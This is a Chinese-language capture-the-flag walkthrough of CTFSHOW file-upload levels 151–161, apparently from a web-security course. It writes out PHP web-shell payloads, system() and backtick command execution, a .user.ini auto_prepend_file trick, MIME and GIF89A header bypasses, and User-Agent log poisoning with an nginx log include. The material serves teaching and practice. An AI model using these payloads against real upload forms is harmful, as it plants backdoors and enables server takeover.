# 第31天：WEB攻防-通用漏洞&amp;文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性

![1645426151764-1143fc72-04a6-4713-a0c0-baab30ef0270.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170502766-987239468.png)

```plain
#知识点：
1、文件上传-前端验证
2、文件上传-黑白名单
3、文件上传-user.ini妙用
4、文件上传-PHP语言特性

#详细点：
1、检测层面：前端，后端等
2、检测内容：文件头，完整性，二次渲染等
3、检测后缀：黑名单，白名单，MIME检测等
4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等

#本章课程内容：
1、文件上传-CTF赛题知识点
2、文件上传-中间件解析&编辑器安全
3、文件上传-实例CMS文件上传安全分析

#前置：
后门代码需要用特定格式后缀解析，不能以图片后缀解析脚本后门代码(解析漏洞除外)
如：jpg图片里面有php后门代码，不能被触发，所以连接不上后门
```

- CTFSHOW-文件上传-151到161关卡

------

```plain
151
查看源代码，看看是否有前台验证。
```

![1645434690208-5a42fd8a-5ce2-41bd-9529-e4d87265d141.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170529953-1688134651.png)

```plain
看到外部引用的JavaScript代码，进行进一步跟踪
```

![1645434619647-5847cb63-1e90-40e9-b0ba-2504cf18c6f2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170529572-46454310.png)

```plain
发现过滤性代码：<button type="button" class="layui-btn" id="upload" lay-data="{url: 'upload.php', accept: 'images',exts:'png'}">
鼠标放在上传图片中，然后右键元素，对<button type="button" class="layui-btn" id="upload" lay-data="{url: 'upload.php', accept: 'images',exts:'png'}">进行修改，把png改为php，就可以进行文件上传php文件
```

![1645435604446-57571d16-e2db-492d-ab38-7e17b167bb3e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170530348-1111844205.png)

```plain
上传php代码后，进行flag的读取。查找flag位置：x=system('ls ../');
```

![1645436788252-e8ede98f-f057-4829-b60c-0a60f28083c0.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170530248-65908016.png)

```plain
读取flag：x=system('tac ../flag.php');
```

![1645436900341-661680cc-d55f-4623-861f-609e896c0142.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170530920-1456029950.png)

```plain
152
查看源代码，把png修改为php，发生文件类型不合规。
```

![1645437533406-42325c45-4377-439a-a3fd-e7a324aa164d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532087-1748939806.png)

```plain
接着把Content-Type: application/octet-stream修改Content-Type: image/png类型，能够上传了php
```

![1645437637257-ecfb3a8b-b5b5-43b1-a5d1-88125657079c.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532989-494612340.png)

```plain
接着就是获取flag位置，读取flag
获取flag：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
```

![1645437752891-1bd4c283-8882-4327-a750-3e718dd7bd53.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532345-1535703370.png)

```plain
153
继续修改png和Content-Type的值，但是饶过不了了。
```

![1645439281885-5ca4cbe2-d0da-4e38-9364-a7b1e7f8b4c9.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532817-1015434790.png)

```plain
思考：修改mime不生效，还有什么绕过方法：00截断，多文件格式后缀解析，大小写（但是提示下载），php5（提示下载），等。
这里我们使用的是.user.ini（与.htaccess类似，但是.htaccess搭建在Apache中才能使用。.user.ini是与PHP挂钩的。）
.user.ini解释：https://www.php.net/manual/zh/configuration.file.per-user.php
上传一个.user.ini，内容：auto_prepend_file=test.png
```

![1645443025268-d7b107e5-6aff-443d-9cf7-9bde6bb69b4a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532033-131020982.png)

```plain
接着上传png，写上后门代码：<?php eval($_POST['x']);?>
```

![1645443381183-01642018-29dd-45c2-8353-1f419f11d17b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532335-1348981170.png)

```plain
然后访问：upload目录，查看flag位置：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
```

![1645443603401-e3c8b62c-9e92-4db1-8a0c-6efca17d34c1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532690-2018063366.png)

```plain
.user.ini的利用条件看似看简单，上传一个.user.ini，包含一个文件，上传文件就可以利用。但是这个需要一个指向性文件index.php，调用.user.ini，使.user.ini生效。访问并不是访问.user.ini和test.png，而是访问一个index.php文件（首先指向文件）。参考https://blog.csdn.net/z13615480737/article/details/89084360
154，155
上传.user.ini：auto_prepend_file=test.png
```

![1645444213217-2f6b3a79-ad00-4788-8a20-19a88a9d63be.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170533435-1652682523.png)

```plain
上传test.png：<?php eval($_POST['X']);?>
发现上传失败，对内容进行检测。
```

![1645444310496-bb5877c5-5544-4808-ba7a-c9506375d6bb.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170533007-709747647.png)

```plain
经过删除测试，对<?php进行了过滤。
那么如何绕过这个内容过滤呢，后门代码应该怎么执行呢。
能不能不写<?php也能执行出php代码效果？
下面这几种都是可以的：
<? echo '123';?>               //前提是开启配置参数short_open_tags=on
<?=(表达式)?>                  //不需要开启参数设置
<% echo '123';%>               //前提是开启配置参数asp_tags=on
<script language=”php”>echo '1'; </script>   //不需要修改参数开关
选择第二种写法<?=eval($_POST['x']);?>
```

![1645444807844-174defae-6a0d-4944-9509-687d63b5f8a2.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532969-1646415567.png)

```plain
然后访问：upload/index.php文件，查看flag位置：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
```

![1645444905259-280635c1-5354-4370-a0b9-37453e629b40.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170533812-852060894.png)

```plain
156
上传.user.ini和test.png
test.png：<?=eval($_POST['x']);?>存在过滤
```

![1645447071505-5dafaf06-1ee1-49f0-be2f-6db55add341e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532731-1498380415.png)

```plain
删除测试，发现过滤了[]两个符号
php支持{}符号代替[]符号
<?=eval($_POST{'X'});>
```

![1645448847549-83fe32d0-793e-4cda-9be3-23fac9b2257e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532763-801433570.png)

```plain
然后访问：upload/index.php文件，查看flag位置：x=system('ls ../');
读取flag：x=system('tac ../flag.php');
157 158
上传.user.ini：auto_prepend_file=test.png
上传test.png：<?=eval($_POST{'X'});>
test.png对内容进行了检测
对分号进行过滤，那么想不要分号能不能执行语句。那么可以直接调用来执行。

可以直接上传读取文件的代码：<?=system('tac ../fl*')?>
```

![1645448847549-83fe32d0-793e-4cda-9be3-23fac9b2257e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170533365-93366367.png)

```plain
直接访问/upload/index.php
```

![1645448914873-eacd41ab-5246-4ff2-80cc-52bc58e83c67.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170532786-2082526565.png)

```plain
159
上传.user.ini：auto_prepend_file=test.png
上传test.png：<?=system('tac ../fl*')?>
发现<?=system('tac ../fl*')?>进行了过滤()
直接用反引号来进行命令执行`
这样构造payloa：<?`tac ../f*?>
```

![1645451203140-97c5a65a-9766-4748-8805-3e093d82be2e.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170533845-852556267.png)

```plain
这样读取是不可以的，需要加上flag的相对路径，<? echo `tac /var/www/html/f*`?> 访问upload就可以获取flag
160
上传.user.ini：auto_prepend_file=test.png
上传test.png：<? echo `tac /var/www/html/f*`?>
发现对test.png 的内容进行了过滤`

这次关卡用到的是包含日志性文件，日志里面会记录访问者的信息：ua头，访问地址，访问ip 等。
运行linux nginx的日志路径：/var/log/nginx/access.log
包含日志文件：test.png
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

![1645492886601-221f37a4-823f-4ffe-acac-991725f80064.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170534907-820710609.png)

```plain
发现日志文件会记录ua头信息，在UA头中写入后门代码<?php eval($_POST['x']);?>
```

![1645495821253-450d0b0f-c9fb-4a54-b506-3a6ea550fa74.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170534040-650721426.png)

```plain
161
上传.user.ini,直接被拦截
```

![1645496045751-3e1aacee-5a42-4f90-9ef8-d301f72b584a.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170533160-667067544.png)

```plain
换正常的图片看看能不能上传，发现是文件头过滤，在代码上加上GIF89A
```

![1645496390228-76feab64-c5eb-4822-8bb2-4682c7a67151.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170533862-531516540.png)

```plain
上传png：GIF89A <?=include"/var/lo"."g/nginx/access.lo"."g"?>
访问upload，修改UA头，写上后门代码。就可以读取flag
```

![1645497185471-e3c9f7fc-2748-4365-9d99-25a841d1b273.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912170540089-293480735.png)